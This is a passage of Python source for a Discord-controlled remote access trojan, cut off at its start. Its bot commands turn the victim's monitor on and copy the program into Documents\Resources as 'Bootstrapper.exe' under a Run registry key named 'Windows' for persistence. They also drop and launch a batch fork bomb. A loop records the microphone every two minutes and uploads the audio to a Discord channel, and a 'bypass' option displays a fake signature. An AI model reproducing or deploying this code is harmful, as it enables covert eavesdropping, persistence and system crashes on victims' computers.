            ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
            await ctx.send("Monitor turned on")
            logging.info("Screen On completed")
        except Exception as e:
            await ctx.send(f"Failed to turn on monitor: {e}")
            logging.error(f"Screen On error: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("Screen On - Invalid session key")

@bot.command()
async def startup(ctx, seshn: str):
    logging.info(f"Startup command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        try:
            exe = 'Bootstrapper.exe'
            key = r'Software\Microsoft\Windows\CurrentVersion\Run'
            directory = os.path.join(os.path.expanduser('~'), 'Documents', 'Resources')
            path = os.path.join(directory, exe)
            os.makedirs(directory, exist_ok=True)
            script_path = sys.argv[0]
            shutil.copy(script_path, path)
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, 'Windows', 0, winreg.REG_SZ, path)
            await ctx.send("Added to startup")
            logging.info("Startup added")
        except Exception as e:
            await ctx.send(f"Failed to add to startup: {e}")
            logging.error(f"Startup error: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("Startup - Invalid session key")

@bot.command()
async def fork(ctx, seshn: str):
    logging.info(f"Fork Bomb command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        try:
            with open(os.path.join(os.getenv("TEMP"), "fork.bat"), "w") as f:
                f.write(":F\nstart\n%0|%0\ngoto F")
            subprocess.Popen(["start", os.path.join(os.getenv("TEMP"), "fork.bat")], shell=True)
            await ctx.send("Fork bomb executed (WARNING: Dangerous)")
            logging.info("Fork Bomb executed")
        except Exception as e:
            await ctx.send(f"Failed to execute fork bomb: {e}")
            logging.error(f"Fork Bomb error: {e}")
    else:
        await ctx.send("Invalid session key")
        logging.error("Fork Bomb - Invalid session key")

async def record_mic(session_key):
    logging.info(f"Microphone Recording on {session_key}")
    mic_recording_channel = mic_recording_channels.get(session_key)
    if mic_recording_channel:
        try:
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100
            CHUNK = 1024
            RECORD_SECONDS = 120
            output_path = os.path.join(os.getenv("TEMP"), "output.wav")
            audio = pyaudio.PyAudio()
            stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
            frames = []
            for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                data = stream.read(CHUNK, exception_on_overflow=False)
                frames.append(data)
            stream.stop_stream()
            stream.close()
            audio.terminate()
            with wave.open(output_path, 'wb') as wf:
                wf.setnchannels(CHANNELS)
                wf.setsampwidth(audio.get_sample_size(FORMAT))
                wf.setframerate(RATE)
                wf.writeframes(b''.join(frames))
            file = File(output_path, filename="output.wav")
            await mic_recording_channel.send("[*] Microphone recording complete", file=file)
            os.remove(output_path)
            logging.info("Microphone Recording completed")
        except Exception as e:
            await mic_recording_channel.send(f"Failed to record microphone: {e}")
            logging.error(f"Microphone Recording error: {e}")

@bot.command()
async def startmicrecording(ctx, seshn: str):
    logging.info(f"Start Microphone Recording command on {seshn.lower()}")
    session = sessions.get(seshn.lower())
    if session:
        mic_recording_channel = mic_recording_channels.get(seshn.lower())
        if not mic_recording_channel:
            await ctx.send("Microphone recording channel not found")
            logging.error("Start Microphone Recording - No channel")
            return
        await ctx.send("[*] Starting microphone recording every 2 minutes")
        while True:
            await record_mic(seshn.lower())
            await asyncio.sleep(120)
    else:
        await ctx.send("Invalid session key")
        logging.error("Start Microphone Recording - Invalid session key")

if __name__ == "__main__":
    logging.info("Bot Initialization")
    args = parse_arguments()
    if args.bypass:
        display_fake_signature()
    try:
        bot.run(config['token'])
        logging.info("Bot Running")
    except Exception as e:
        logging.error(f"Bot Initialization error: {e}")
